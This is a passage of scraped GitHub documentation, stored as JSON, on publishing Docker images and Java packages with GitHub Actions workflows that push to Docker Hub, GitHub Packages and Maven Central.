        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Publish Docker image\n\non:\n  release:\n    types: [published]\n\njobs:\n  push_to_registry:\n    name: Push Docker image to Docker Hub\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n      attestations: write\n      id-token: write\n    steps:\n      - name: Check out the repo\n        uses: actions/checkout@v4\n\n      - name: Log in to Docker Hub\n        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          username: ${{ secrets.DOCKER_USERNAME }}\n          password: ${{ secrets.DOCKER_PASSWORD }}\n\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: my-docker-hub-namespace/my-docker-hub-repository\n\n      - name: Build and push Docker image\n        id: push\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          file: ./Dockerfile\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: index.docker.io/my-docker-hub-namespace/my-docker-hub-repository\n          subject-digest: ${{ steps.push.outputs.digest }}\n          push-to-registry: true"
      },
      {
        "type": "paragraph",
        "text": "The above workflow checks out the GitHub repository, uses thelogin-actionto log in to the registry, and then uses thebuild-push-actionaction to: build a Docker image based on your repository'sDockerfile; push the image to Docker Hub, and apply a tag to the image."
      },
      {
        "type": "paragraph",
        "text": "In the last step, it generates an artifact attestation for the image, which increases supply chain security. For more information, seeUsing artifact attestations to establish provenance for builds."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing images to GitHub Packages"
      },
      {
        "type": "paragraph",
        "text": "Each time you create a new release on GitHub, you can trigger a workflow to publish your image. The workflow in the example below runs when a change is pushed to thereleasebranch."
      },
      {
        "type": "paragraph",
        "text": "In the example workflow below, we use the Dockerlogin-action,metadata-action, andbuild-push-actionactions to build the Docker image, and if the build succeeds, push the built image to GitHub Packages."
      },
      {
        "type": "paragraph",
        "text": "Thelogin-actionoptions required for GitHub Packages are:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "registry: Must be set toghcr.io.",
          "username: You can use the${{ github.actor }}context to automatically use the username of the user that triggered the workflow run. For more information, seeAccessing contextual information about workflow runs.",
          "password: You can use the automatically-generatedGITHUB_TOKENsecret for the password. For more information, seeAutomatic token authentication."
        ]
      },
      {
        "type": "paragraph",
        "text": "Themetadata-actionoption required for GitHub Packages is:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "images: The namespace and name for the Docker image you are building."
        ]
      },
      {
        "type": "paragraph",
        "text": "Thebuild-push-actionoptions required for GitHub Packages are:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "context: Defines the build's context as the set of files located in the specified path.",
          "push: If set totrue, the image will be pushed to the registry if it is built successfully.",
          "tagsandlabels: These are populated by output frommetadata-action."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "This workflow uses actions that are not certified by GitHub. They are provided by a third-party and are governed by separate terms of service, privacy policy, and support documentation.",
          "GitHub recommends pinning actions to a commit SHA. To get a newer version, you will need to update the SHA. You can also reference a tag or branch, but the action may change without warning."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Create and publish a Docker image"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches: ['release']"
      },
      {
        "type": "paragraph",
        "text": "Configures this workflow to run every time a change is pushed to the branch calledrelease."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "env:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}"
      },
      {
        "type": "paragraph",
        "text": "Defines two custom environment variables for the workflow. These are used for the Container registry domain, and a name for the Docker image that this workflow builds."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  build-and-push-image:\n    runs-on: ubuntu-latest"
      },
      {
        "type": "paragraph",
        "text": "There is a single job in this workflow. It's configured to run on the latest available version of Ubuntu."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n      contents: read\n      packages: write\n      attestations: write\n      id-token: write"
      },
      {
        "type": "paragraph",
        "text": "Sets the permissions granted to theGITHUB_TOKENfor the actions in this job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Log in to the Container registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "Uses thedocker/login-actionaction to log in to the Container registry registry using the account and password that will publish the packages. Once published, the packages are scoped to the account defined here."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}"
      },
      {
        "type": "paragraph",
        "text": "This step usesdocker/metadata-actionto extract tags and labels that will be applied to the specified image. Theid\"meta\" allows the output of this step to be referenced in a subsequent step. Theimagesvalue provides the base name for the tags and labels."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Build and push Docker image\n        id: push\n        uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4\n        with:\n          context: .\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}"
      },
      {
        "type": "paragraph",
        "text": "This step uses thedocker/build-push-actionaction to build the image, based on your repository'sDockerfile. If the build succeeds, it pushes the image to GitHub Packages.\nIt uses thecontextparameter to define the build's context as the set of files located in the specified path. For more information, seeUsagein the README of thedocker/build-push-actionrepository.\nIt uses thetagsandlabelsparameters to tag and label the image with the output from the \"meta\" step."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME}}\n          subject-digest: ${{ steps.push.outputs.digest }}\n          push-to-registry: true"
      },
      {
        "type": "paragraph",
        "text": "This step generates an artifact attestation for the image, which is an unforgeable statement about where and how it was built. It increases supply chain security for people who consume the image. For more information, seeUsing artifact attestations to establish provenance for builds."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "#\nname: Create and publish a Docker image\n\n# Configures this workflow to run every time a change is pushed to the branch called `release`.\non:\n  push:\n    branches: ['release']\n\n# Defines two custom environment variables for the workflow. These are used for the Container registry domain, and a name for the Docker image that this workflow builds.\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n\n# There is a single job in this workflow. It's configured to run on the latest available version of Ubuntu.\njobs:\n  build-and-push-image:\n    runs-on: ubuntu-latest\n    # Sets the permissions granted to the `GITHUB_TOKEN` for the actions in this job.\n    permissions:\n      contents: read\n      packages: write\n      attestations: write\n      id-token: write\n      #\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n      # Uses the `docker/login-action` action to log in to the Container registry registry using the account and password that will publish the packages. Once published, the packages are scoped to the account defined here.\n      - name: Log in to the Container registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n      # This step uses [docker/metadata-action](https://github.com/docker/metadata-action#about) to extract tags and labels that will be applied to the specified image. The `id` \"meta\" allows the output of this step to be referenced in a subsequent step. The `images` value provides the base name for the tags and labels.\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n      # This step uses the `docker/build-push-action` action to build the image, based on your repository's `Dockerfile`. If the build succeeds, it pushes the image to GitHub Packages.\n      # It uses the `context` parameter to define the build's context as the set of files located in the specified path. For more information, see [Usage](https://github.com/docker/build-push-action#usage) in the README of the `docker/build-push-action` repository.\n      # It uses the `tags` and `labels` parameters to tag and label the image with the output from the \"meta\" step.\n      - name: Build and push Docker image\n        id: push\n        uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4\n        with:\n          context: .\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n      \n      # This step generates an artifact attestation for the image, which is an unforgeable statement about where and how it was built. It increases supply chain security for people who consume the image. For more information, see [Using artifact attestations to establish provenance for builds](/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME}}\n          subject-digest: ${{ steps.push.outputs.digest }}\n          push-to-registry: true"
      },
      {
        "type": "paragraph",
        "text": "The above workflow is triggered by a push to the \"release\" branch. It checks out the GitHub repository, and uses thelogin-actionto log in to the Container registry. It then extracts labels and tags for the Docker image. Finally, it uses thebuild-push-actionaction to build the image and publish it on the Container registry."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing images to Docker Hub and GitHub Packages"
      },
      {
        "type": "paragraph",
        "text": "In a single workflow, you can publish your Docker image to multiple registries by using thelogin-actionandbuild-push-actionactions for each registry."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow uses the steps from the previous sections (Publishing images to Docker HubandPublishing images to GitHub Packages) to create a single workflow that pushes to both registries."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Publish Docker image\n\non:\n  release:\n    types: [published]\n\njobs:\n  push_to_registries:\n    name: Push Docker image to multiple registries\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n      attestations: write\n      id-token: write\n    steps:\n      - name: Check out the repo\n        uses: actions/checkout@v4\n\n      - name: Log in to Docker Hub\n        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          username: ${{ secrets.DOCKER_USERNAME }}\n          password: ${{ secrets.DOCKER_PASSWORD }}\n\n      - name: Log in to the Container registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: |\n            my-docker-hub-namespace/my-docker-hub-repository\n            ghcr.io/${{ github.repository }}\n\n      - name: Build and push Docker images\n        id: push\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: ghcr.io/${{ github.repository }}\n          subject-digest: ${{ steps.push.outputs.digest }}\n          push-to-registry: true"
      },
      {
        "type": "paragraph",
        "text": "The above workflow checks out the GitHub repository, uses thelogin-actiontwice to log in to both registries and generates tags and labels with themetadata-actionaction.\nThen thebuild-push-actionaction builds and pushes the Docker image to Docker Hub and the Container registry."
      },
      {
        "type": "paragraph",
        "text": "In the last step, it generates an artifact attestation for the image, which increases supply chain security. For more information, seeUsing artifact attestations to establish provenance for builds."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-gradle",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a workflow that publishes Java packages to GitHub Packages and the Maven Central Repository. With a single workflow, you can publish packages to a single repository or to multiple repositories."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "The examples used in this guide refer to the Legacy OSSRH service. SeePublishingin the Maven Central Repository documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of workflow files and configuration options. For more information, seeWriting workflows."
      },
      {
        "type": "paragraph",
        "text": "For more information about creating a CI workflow for your Java project with Gradle, seeBuilding and testing Java with Gradle."
      },
      {
        "type": "paragraph",
        "text": "You may also find it helpful to have a basic understanding of the following:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Working with the Apache Maven registry",
          "Store information in variables",
          "Using secrets in GitHub Actions",
          "Automatic token authentication"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About package configuration"
      },
      {
        "type": "paragraph",
        "text": "ThegroupIdandartifactIdfields in theMavenPublicationsection of thebuild.gradlefile create a unique identifier for your package that registries use to link your package to a registry. This is similar to thegroupIdandartifactIdfields of the Mavenpom.xmlfile. For more information, see theMaven Publish Pluginin the Gradle documentation."
      },
      {
        "type": "paragraph",
        "text": "Thebuild.gradlefile also contains configuration for the distribution management repositories that Gradle will publish packages to. Each repository must have a name, a deployment URL, and credentials for authentication."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages to the Maven Central Repository"
      },
      {
        "type": "paragraph",
        "text": "Each time you create a new release, you can trigger a workflow to publish your package. The workflow in the example below runs when thereleaseevent triggers with typecreated. The workflow publishes the package to the Maven Central Repository if CI tests pass. For more information on thereleaseevent, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "You can define a new Maven repository in the publishing block of yourbuild.gradlefile that points to your package repository. For example, if you were deploying to the Maven Central Repository through the OSSRH hosting project, yourbuild.gradlecould specify a repository with the name\"OSSRH\"."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "plugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"OSSRH\"\n      url = \"https://oss.sonatype.org/service/local/staging/deploy/maven2/\"\n      credentials {\n        username = System.getenv(\"MAVEN_USERNAME\")\n        password = System.getenv(\"MAVEN_PASSWORD\")\n      }\n    }\n  }\n}"
      },
      {
        "type": "paragraph",
        "text": "With this configuration, you can create a workflow that publishes your package to the Maven Central Repository by running thegradle publishcommand. In the deploy step, you’ll need to set environment variables for the username and password or token that you use to authenticate to the Maven repository. For more information, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Publish package to the Maven Central Repository\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Java\n        uses: actions/setup-java@v4\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n\n      - name: Setup Gradle\n        uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n      - name: Publish package\n        run: ./gradlew publish\n        env:\n          MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}\n          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "This workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out a copy of project's repository.",
          "Sets up the Java JDK.",
          "Sets up the Gradle environment. Thegradle/actions/setup-gradleaction takes care of caching state between workflow runs, and provides a detailed summary of all Gradle executions.",
          "Executes the Gradlepublishtask to publish to theOSSRHMaven repository. TheMAVEN_USERNAMEenvironment variable will be set with the contents of yourOSSRH_USERNAMEsecret, and theMAVEN_PASSWORDenvironment variable will be set with the contents of yourOSSRH_TOKENsecret.For more information about using secrets in your workflow, seeUsing secrets in GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages to GitHub Packages"
      },
      {
        "type": "paragraph",
        "text": "Each time you create a new release, you can trigger a workflow to publish your package. The workflow in the example below runs when thereleaseevent triggers with typecreated. The workflow publishes the package to GitHub Packages if CI tests pass. For more information on thereleaseevent, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "You can define a new Maven repository in the publishing block of yourbuild.gradlethat points to GitHub Packages. In that repository configuration, you can also take advantage of environment variables set in your CI workflow run. You can use theGITHUB_ACTORenvironment variable as a username, and you can set theGITHUB_TOKENenvironment variable with yourGITHUB_TOKENsecret."
      },
      {
        "type": "paragraph",
        "text": "TheGITHUB_TOKENsecret is set to an access token for the repository each time a job in a workflow begins. You should set the permissions for this access token in the workflow file to grant read access for thecontentspermission and write access for thepackagespermission. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "For example, if your organization is named \"octocat\" and your repository is named \"hello-world\", then the GitHub Packages configuration inbuild.gradlewould look similar to the below example."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "plugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"GitHubPackages\"\n      url = \"https://maven.pkg.github.com/octocat/hello-world\"\n      credentials {\n        username = System.getenv(\"GITHUB_ACTOR\")\n        password = System.getenv(\"GITHUB_TOKEN\")\n      }\n    }\n  }\n}"
      },
      {
        "type": "paragraph",
        "text": "With this configuration, you can create a workflow that publishes your package to GitHub Packages by running thegradle publishcommand."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Publish package to GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-java@v4\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Setup Gradle\n        uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n      - name: Publish package\n        run: ./gradlew publish\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "This workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out a copy of project's repository.",
          "Sets up the Java JDK.",
          "Sets up the Gradle environment. Thegradle/actions/setup-gradleaction takes care of caching state between workflow runs, and provides a detailed summary of all Gradle executions.",
          "Executes the Gradlepublishtask to publish to GitHub Packages. TheGITHUB_TOKENenvironment variable will be set with the content of theGITHUB_TOKENsecret. Thepermissionskey specifies the access that theGITHUB_TOKENsecret will allow.For more information about using secrets in your workflow, seeUsing secrets in GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages to the Maven Central Repository and GitHub Packages"
      },
      {
        "type": "paragraph",
        "text": "You can publish your packages to both the Maven Central Repository and GitHub Packages by configuring each in yourbuild.gradlefile."
      },
      {
        "type": "paragraph",
        "text": "Ensure yourbuild.gradlefile includes a repository for both your GitHub repository and your Maven Central Repository provider."
      },
      {
        "type": "paragraph",
        "text": "For example, if you deploy to the Central Repository through the OSSRH hosting project, you might want to specify it in a distribution management repository with thenameset toOSSRH. If you deploy to GitHub Packages, you might want to specify it in a distribution management repository with thenameset toGitHubPackages."
      },
      {
        "type": "paragraph",
        "text": "If your organization is named \"octocat\" and your repository is named \"hello-world\", then the configuration inbuild.gradlewould look similar to the below example."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "plugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"OSSRH\"\n      url = \"https://oss.sonatype.org/service/local/staging/deploy/maven2/\"\n      credentials {\n        username = System.getenv(\"MAVEN_USERNAME\")\n        password = System.getenv(\"MAVEN_PASSWORD\")\n      }\n    }\n    maven {\n      name = \"GitHubPackages\"\n      url = \"https://maven.pkg.github.com/octocat/hello-world\"\n      credentials {\n        username = System.getenv(\"GITHUB_ACTOR\")\n        password = System.getenv(\"GITHUB_TOKEN\")\n      }\n    }\n  }\n}"
      },
      {
        "type": "paragraph",
        "text": "With this configuration, you can create a workflow that publishes your package to both the Maven Central Repository and GitHub Packages by running thegradle publishcommand."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Publish package to the Maven Central Repository and GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Java\n        uses: actions/setup-java@v4\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Setup Gradle\n        uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n      - name: Publish package\n        run: ./gradlew publish\n        env: \n          MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}\n          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "This workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out a copy of project's repository.",
          "Sets up the Java JDK.",
          "Sets up the Gradle environment. Thegradle/actions/setup-gradleaction takes care of caching state between workflow runs, and provides a detailed summary of all Gradle executions.",
          "Executes the Gradlepublishtask to publish to theOSSRHMaven repository and GitHub Packages. TheMAVEN_USERNAMEenvironment variable will be set with the contents of yourOSSRH_USERNAMEsecret, and theMAVEN_PASSWORDenvironment variable will be set with the contents of yourOSSRH_TOKENsecret. TheGITHUB_TOKENenvironment variable will be set with the content of theGITHUB_TOKENsecret. Thepermissionskey specifies the access that theGITHUB_TOKENsecret will allow.For more information about using secrets in your workflow, seeUsing secrets in GitHub Actions."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-maven",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a workflow that publishes Java packages to GitHub Packages and the Maven Central Repository. With a single workflow, you can publish packages to a single repository or to multiple repositories."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "The examples used in this guide refer to the Legacy OSSRH service. SeePublishingin the Maven Central Repository documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of workflow files and configuration options. For more information, seeWriting workflows."
      },
      {
        "type": "paragraph",
        "text": "For more information about creating a CI workflow for your Java project with Maven, seeBuilding and testing Java with Maven."
      },
      {
        "type": "paragraph",
        "text": "You may also find it helpful to have a basic understanding of the following:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Working with the Apache Maven registry",
          "Store information in variables",
          "Using secrets in GitHub Actions",
          "Automatic token authentication"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About package configuration"
      },
      {
        "type": "paragraph",
        "text": "ThegroupIdandartifactIdfields in thepom.xmlfile create a unique identifier for your package that registries use to link your package to a registry. For more information seeGuide to uploading artifacts to the Central Repositoryin the Apache Maven documentation."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Your Apache Maven package must follow the naming convention, and therefore theartifactIdfield should only contain lowercase letters, digits, or hyphens. For more information, seeNaming convention of Maven coordinatesin the maven.apache.org documentation. If you use uppercase letters in the artifact name, you'll get a422 Unprocessable Entityresponse."
      },
      {
        "type": "paragraph",
        "text": "Thepom.xmlfile also contains configuration for the distribution management repositories that Maven will deploy packages to. Each repository must have a name and a deployment URL. Authentication for these repositories can be configured in the.m2/settings.xmlfile in the home directory of the user running Maven."
      },
      {
        "type": "paragraph",
        "text": "You can use thesetup-javaaction to configure the deployment repository as well as authentication for that repository. For more information, seesetup-java."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages to the Maven Central Repository"
      },
      {
        "type": "paragraph",
        "text": "Each time you create a new release, you can trigger a workflow to publish your package. The workflow in the example below runs when thereleaseevent triggers with typecreated. The workflow publishes the package to the Maven Central Repository if CI tests pass. For more information on thereleaseevent, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "In this workflow, you can use thesetup-javaaction. This action installs the given version of the JDK into thePATH, but it also configures a Mavensettings.xmlfor publishing packages. By default, the settings file will be configured for GitHub Packages, but it can be configured to deploy to another package registry, such as the Maven Central Repository. If you already have a distribution management repository configured inpom.xml, then you can specify thatidduring thesetup-javaaction invocation."
      },
      {
        "type": "paragraph",
        "text": "For example, if you were deploying to the Maven Central Repository through the OSSRH hosting project, yourpom.xmlcould specify a distribution management repository with theidofossrh."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "<project ...>\n  ...\n  <distributionManagement>\n    <repository>\n      <id>ossrh</id>\n      <name>Central Repository OSSRH</name>\n      <url>https://oss.sonatype.org/service/local/staging/deploy/maven2/</url>\n    </repository>\n  </distributionManagement>\n</project>"
      },
      {
        "type": "paragraph",
        "text": "With this configuration, you can create a workflow that publishes your package to the Maven Central Repository by specifying the repository managementidto thesetup-javaaction. You’ll also need to provide environment variables that contain the username and password to authenticate to the repository."
      },
      {
        "type": "paragraph",
        "text": "In the deploy step, you’ll need to set the environment variables to the username that you authenticate with to the repository, and to a secret that you’ve configured with the password or token to authenticate with. For more information, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Publish package to the Maven Central Repository\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Maven Central Repository\n        uses: actions/setup-java@v4\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n          server-id: ossrh\n          server-username: MAVEN_USERNAME\n          server-password: MAVEN_PASSWORD\n      - name: Publish package\n        run: mvn --batch-mode deploy\n        env:\n          MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}\n          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "This workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out a copy of project's repository.",
          "Sets up the Java JDK, and also configures the Mavensettings.xmlfile to add authentication for theossrhrepository using theMAVEN_USERNAMEandMAVEN_PASSWORDenvironment variables.",
          "Runs themvn --batch-mode deploycommand to publish to theossrhrepository. TheMAVEN_USERNAMEenvironment variable will be set with the contents of yourOSSRH_USERNAMEsecret, and theMAVEN_PASSWORDenvironment variable will be set with the contents of yourOSSRH_TOKENsecret.For more information about using secrets in your workflow, seeUsing secrets in GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages to GitHub Packages"
      },
      {
        "type": "paragraph",
        "text": "Each time you create a new release, you can trigger a workflow to publish your package. The workflow in the example below runs when thereleaseevent triggers with typecreated. The workflow publishes the package to GitHub Packages if CI tests pass. For more information on thereleaseevent, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "In this workflow, you can use thesetup-javaaction. This action installs the given version of the JDK into thePATH, and also sets up a Mavensettings.xmlfor publishing the package to GitHub Packages. The generatedsettings.xmldefines authentication for a server with anidofgithub, using theGITHUB_ACTORenvironment variable as the username and theGITHUB_TOKENenvironment variable as the password. TheGITHUB_TOKENenvironment variable is assigned the value of the specialGITHUB_TOKENsecret."
      },
      {
        "type": "paragraph",
        "text": "TheGITHUB_TOKENsecret is set to an access token for the repository each time a job in a workflow begins. You should set the permissions for this access token in the workflow file to grant read access for thecontentspermission and write access for thepackagespermission. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "For a Maven-based project, you can make use of these settings by creating a distribution repository in yourpom.xmlfile with anidofgithubthat points to your GitHub Packages endpoint."
      },
      {
        "type": "paragraph",
        "text": "For example, if your organization is named \"octocat\" and your repository is named \"hello-world\", then the GitHub Packages configuration inpom.xmlwould look similar to the below example."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "<project ...>\n  ...\n  <distributionManagement>\n    <repository>\n      <id>github</id>\n      <name>GitHub Packages</name>\n      <url>https://maven.pkg.github.com/octocat/hello-world</url>\n    </repository>\n  </distributionManagement>\n</project>"
      },
      {
        "type": "paragraph",
